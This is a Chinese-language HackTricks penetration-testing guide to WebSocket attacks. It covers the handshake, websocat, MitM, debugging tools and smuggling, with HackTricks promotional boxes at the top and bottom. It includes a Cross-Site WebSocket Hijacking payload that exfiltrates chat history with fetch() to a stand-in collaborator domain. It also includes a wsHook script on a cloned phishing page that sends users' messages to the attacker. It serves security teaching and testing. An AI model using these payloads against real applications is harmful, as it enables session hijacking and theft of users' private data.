# WebSocket 攻击

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 什么是 WebSockets

WebSocket 连接是通过 **HTTP** 发起的，通常是**长期存在**的。消息可以在**任何时间双向发送**，并且不是事务性的。连接通常会保持打开和空闲状态，直到客户端或服务器准备发送消息。\
WebSockets 在需要**低延迟或服务器发起消息**的情况下特别有用，例如金融数据的实时提供。

### WebSocket 连接是如何建立的？

(这里您将找到一个总结，但关于如何创建 web socket 连接的**更详细指南**可以在[**这里**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)找到)。\
WebSocket 连接通常使用类似以下的客户端 JavaScript 创建：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
**`wss`** 协议通过加密的 **TLS** 连接建立 WebSocket，而 **`ws`** 协议使用未加密的连接。

为了建立连接，浏览器和服务器通过 HTTP 执行 WebSocket 握手。浏览器发出类似以下的 WebSocket 握手请求：
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
如果服务器接受连接，它会返回如下的WebSocket握手响应：
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
在这一点上，网络连接保持打开状态，并且可以用来在任一方向发送WebSocket消息。

**注意**

WebSocket **握手**消息的几个**特点**值得注意：

* 请求和响应中的 **`Connection`** 和 **`Upgrade`** 头部**表明**这是一个**WebSocket握手**。
* **`Sec-WebSocket-Version`** 请求头指定客户端希望使用的**WebSocket协议版本**。通常是 `13`。
* **`Sec-WebSocket-Key`** 请求头包含一个Base64编码的**随机值**，每个握手请求中应该随机生成。
* **`Sec-WebSocket-Accept`** 响应头包含一个哈希值，该值是将 `Sec-WebSocket-Key` 请求头中提交的值与协议规范中定义的特定字符串连接后得到的。这样做是为了防止由于服务器配置错误或缓存代理而产生的误导性响应。

**`Sec-WebSocket-Key`** 头部包含一个**随机值**，以防止来自缓存代理的错误，并且**不用于认证或会话处理目的**（_它不是CSRF令牌_）。

### Linux控制台

你可以使用 `websocat` 来建立与websocket的原始连接。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
或者创建一个 websocat 服务器：
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### 中间人攻击websocket连接

如果你发现客户端正在你当前的本地网络中连接到一个**HTTP websocket**，你可以尝试一个[ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)来执行客户端和服务器之间的MitM攻击。\
一旦客户端尝试连接，你可以使用：
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets 枚举

您可以使用工具 [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) 自动发现、指纹识别并搜索 websockets 中的已知漏洞。

### Websocket 调试工具

* **Burp Suite** 支持 MitM websockets 通信，其方式与常规 HTTP 通信非常相似。
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite 扩展**将允许您通过获取**历史记录**、设置**拦截规则**、使用**匹配和替换**规则、使用**Intruder** 和 **AutoRepeater** 更好地管理 Burp 中的 Websocket 通信。
* [**WSSiP**](https://github.com/nccgroup/wssip)：简称 "**WebSocket/Socket.io 代理**"，这个基于 Node.js 的工具提供了一个用户界面，用于**捕获、拦截、发送自定义**消息并查看客户端和服务器之间所有 WebSocket 和 Socket.IO 通信。
* [**wsrepl**](https://github.com/doyensec/wsrepl) 是一个为渗透测试专门设计的**交互式 websocket REPL**。它提供了一个界面，用于观察**传入的 websocket 消息并发送新消息**，并提供了一个易于使用的框架来**自动化**这种通信。
* [**https://websocketking.com/**](https://websocketking.com/) 是一个**网页，用于**使用**websockets**与其他网页通信。
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) 在其他类型的通信/协议中，它提供了一个**网页，用于**使用**websockets**与其他网页通信。

## Websocket 实验室

在 [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) 中，您有一个代码可以启动一个使用 websockets 的网页，在[**这篇文章**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)中可以找到解释。

## 跨站 WebSocket 劫持 (CSWSH)

也称为 _跨源 WebSocket 劫持_。\
**它是** [**跨站请求伪造 (CSRF)**](csrf-cross-site-request-forgery.md) **在 WebSocket 握手上的应用。**

当**WebSocket 握手**请求仅依赖**HTTP cookies**进行会话处理并**不包含任何 CSRF 令牌**或其他不可预测的值时，就会出现这种情况。\
攻击者可以在他们自己的域上创建一个**恶意网页**，该网页**建立跨站 WebSocket**连接到易受攻击的应用程序。应用程序将在**受害用户与应用程序的会话上下文中**处理连接。

### 简单攻击

请注意，在**建立**一个**websocket**连接时，**cookie**会被**发送**到服务器。服务器可能会使用它来**关联**每个**特定**用户与他的**websocket**会话，基于发送的 cookie。

然后，如果**例如** websocket **服务器**在收到 "**READY"** 消息时**发送回用户的对话历史**，那么一个**简单的 XSS** 建立连接（**cookie** 将会**自动发送**以授权受害用户）**发送** "**READY**" 将能够**检索**对话的**历史记录**。
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### 跨源 + 不同子域的 Cookie

在这篇博客文章 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) 中，攻击者成功地**在子域中执行任意 Javascript**，该子域属于正在进行 web socket 通信的域。因为它是一个**子域**，**cookie** 被**发送**了，由于**Websocket 没有正确检查 Origin**，因此可以与之通信并**窃取其中的 tokens**。

### 从用户处窃取数据

复制你想要冒充的 web 应用程序（例如 .html 文件），并在发生 websocket 通信的脚本中添加以下代码：
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
现在从 [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) 下载 `wsHook.js` 文件，并**将其保存在包含网页文件的文件夹内**。\
通过暴露网络应用程序并使用户连接到它，您将能够通过websocket窃取发送和接收的消息：
```javascript
sudo python3 -m http.server 80
```
## 竞态条件

WebSockets 中的竞态条件也是一个问题，[查看此信息以了解更多](race-condition.md#rc-in-websockets)。

## 其他漏洞

由于 Web Sockets 是一种**向服务器端和客户端发送数据的机制**，根据服务器和客户端处理信息的方式，**Web Sockets 可以被用来利用 XSS、SQLi 或任何其他常见的 web 漏洞，使用 websocket 的用户输入。**

## **WebSocket Smuggling**

这个漏洞可能允许你**绕过反向代理的限制**，让它们相信**已经建立了 websocket 通信**（即使这不是真的）。这可能允许攻击者**访问隐藏的端点**。更多信息请查看以下页面：

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## 参考资料

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks 中看到你的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。**

</details>
